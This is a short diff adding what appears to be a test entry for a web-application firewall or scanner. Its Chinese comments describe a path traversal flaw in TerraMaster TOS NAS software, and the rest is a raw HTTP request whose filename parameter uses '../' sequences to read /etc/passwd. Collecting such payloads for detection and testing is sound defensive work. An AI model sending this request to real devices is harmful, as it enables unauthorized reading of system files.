@@ -1,0 +1,10 @@
+# TerraMaster TOS 目录遍历漏洞
+# Terramaster TOS是中国深圳市图美电子技术（Terramaster）公司的一款基于Linux平台的，专用于erraMaster云存储NAS服务器的操作系统。
+# TerraMaster TOS 4.2.06版本及之前版本存在路径遍历漏洞，该漏洞允许远程身份验证攻击者可利用该漏洞通过(1)filename参数来读取、编辑或删除文件系统中的任何文件。
+GET /tos/index.php?editor/fileGet&filename=../../../../../../etc/passwd&acid=80001637&bid=hd_tag_m8mv2594 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2594
+RM-PRO-Token: 5536e2892bbb70019a981c96589a867a
+RM-PRO-Time: 1742808452583
+User-Agent: curl/7.83.1
+
